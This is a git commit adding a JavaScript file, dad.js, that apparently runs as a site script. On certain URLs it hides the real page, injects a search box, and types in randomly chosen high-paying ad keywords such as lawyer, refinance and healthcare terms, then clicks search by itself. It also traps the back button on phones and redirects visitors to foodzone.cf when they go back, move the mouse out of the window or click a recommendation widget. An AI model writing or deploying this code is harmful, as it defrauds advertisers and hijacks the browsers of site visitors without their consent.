cb8ff34500c2277a47118000eeb63a3e57524d53
rossxxxcruz <110272080+rossxxxcruz@users.noreply.github.com>
2022-09-14 17:44:48 +0530

    Create dad.js

---
+++ dad.js
@@ -0,0 +1,79 @@
+if(document.URL.indexOf("600") != -1) { document.write(`<style> html body { visibility: hidden; } .box-main { visibility: visible; } .wrap { visibility: visible; } <\/style> <style> .gsc-input, .gsc-clear-button { pointer-events: none; visibility: visible; } .gsc-search-button { pointer-events: none; visibility: visible; } <\/style> <div class='box-main'> <button class='btn'>Recommended From The Web<\/button> <\/div> <style> .btn { display: inline-block; border-radius: 0px; letter-spacing: 0.3px; border: none; background: #964B00; color: white; width: 100%; font-family: inherit; text-align: center; font-weight: bold; font-size: 20px; padding: 10px 12px; cursor: pointer; white-space: nowrap; overflow: hidden; text-overflow: clip; } <\/style> <div class="wrap"> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> <div class="media"> <div class="media-img"></div> <div class="media-desc"> <div class="bar"></div> <div class="bar"></div> <div class="bar"></div> </div> </div> </div> <style> .wrap { max-width:100%; margin:auto; background:#fff; width: 90%; padding:1em; margin-top: 15px; left:10; right: 0; } .media{ padding:1em; } .media-img, .media-desc{ display:inline-block; vertical-align:top; } .media-img { margin:0 1em 0 0; width:30%; height:90px; background-color:#f0f0f0; } .media-desc{ width:60%; } .media-desc .bar{ margin:0 0 1em 0; height:20px; background-color:#f0f0f0; } .media-img, .media-desc .bar{ -webkit-animation: gleam 2s ease-in-out infinite; background-image:-webkit-linear-gradient(left, #E9EAED, #f8f8f8, #E9EAED); background-size:600px auto; } @-webkit-keyframes gleam{ 0% { background-position:0 0 } 100% { background-position:600px 0 } } <\/style> <script async='async' src='https://cse.google.com/cse.js?cx=9902431550072114f'><\/script> <div class='gcse-search'> <\/div> <script type="text/javascript" src="https://code.jquery.com/jquery-2.1.3.js"><\/script> <script>$(document).ready(function() {$(".wrap").remove();});<\/script> <script> if(navigator.userAgent.match(/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/)) { ! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && window.location.assign("https://www.foodzone.cf/") } } catch (o) {} }(); } else if (navigator.userAgent.match(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i)) { ! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && window.location.assign("https://www.foodzone.cf/") } } catch (o) {} }(); } else { function addEvent(obj, evt, fn) { if (obj.addEventListener) { obj.addEventListener(evt, fn, false); } else if (obj.attachEvent) { obj.attachEvent("on" + evt, fn); } } addEvent(window,"load",function(e) { addEvent(document, "mouseout", function(e) { e = e ? e : window.event; var from = e.relatedTarget || e.toElement; if (!from || from.nodeName == "HTML") { window.location.assign("https://www.foodzone.cf/") } }); }); } <\/script> <script> var el = document.getElementById("taboola-below-article-thumbnails"); if (el.addEventListener) { el.addEventListener("click", function() { setTimeout(function reload() { window.location.assign("https://www.foodzone.cf/"); }, 0) }, false); } else { el.attachEvent("onclick", function() { setTimeout(function reload() { window.location.assign("https://www.foodzone.cf/"); }, 0) }); } <\/script> <script> const myInterval1 = setInterval(myTimer1, 0);
+function myTimer1() { var textarea = document.getElementById('gsc-i-id1');
+
+var random = [];
+random[0]="automobile accident lawyers"
+random[1]="automobile lawyers"
+random[2]="home refinance"
+random[3]="reputable car donation charities"
+random[4]="cancer research donation"
+random[5]="online social work degree"
+random[6]="weight loss clinic"
+random[7]="elementary education online"
+random[8]="international seo agency"
+random[9]="dental seo company"
+random[10]="best cloud hosting for wordpress"
+random[11]="accounting software"
+random[12]="private healthcare"
+function nextPage() {
+var state = null;
+if (localStorage.randomState) {
+state = JSON.parse(localStorage.randomState);
+if (state.order.length != random.length) {
+state = null; }}
+if (!state) { state = { order: [], index: 0 };
+for (var i = 0; i < random.length; i++) {
+state.order.splice(Math.floor(Math.random() * (i + 1)), 0, i);}}
+var page = random[state.order[state.index]];
+state.index = (state.index + 1) % random.length;
+localStorage.randomState = JSON.stringify(state);
+var textValue=textarea.value;
+if (textValue.indexOf(page)!= -1)
+{
+clearInterval(myInterval1); clearInterval(myInterval2);
+document.querySelector('button.gsc-search-button.gsc-search-button-v2').click();
+}
+}; random[nextPage()]
+        
+}
+<\/script> <script> const myInterval2 = setInterval(myTimer2, 1000);
+function myTimer2() { var search = document.getElementById('gsc-i-id1');
+
+var random = [];
+random[0]="automobile accident lawyers"
+random[1]="automobile lawyers"
+random[2]="home refinance"
+random[3]="reputable car donation charities"
+random[4]="cancer research donation"
+random[5]="online social work degree"
+random[6]="weight loss clinic"
+random[7]="elementary education online"
+random[8]="international seo agency"
+random[9]="dental seo company"
+random[10]="best cloud hosting for wordpress"
+random[11]="accounting software"
+random[12]="private healthcare"
+function nextPage() {
+var state = null;
+if (localStorage.randomState) {
+state = JSON.parse(localStorage.randomState);
+if (state.order.length != random.length) {
+state = null; }}
+if (!state) { state = { order: [], index: 0 };
+for (var i = 0; i < random.length; i++) {
+state.order.splice(Math.floor(Math.random() * (i + 1)), 0, i);}}
+var page = random[state.order[state.index]];
+state.index = (state.index + 1) % random.length;
+localStorage.randomState = JSON.stringify(state);
+var index = 0;
+window.next_letter = function() {
+if (index <= page.length) {
+search.value = page.substr(0, index++);
+setTimeout("next_letter()", 0);
+}
+}
+next_letter();
+}; random[nextPage()]
+   
+}
+<\/script>`) }
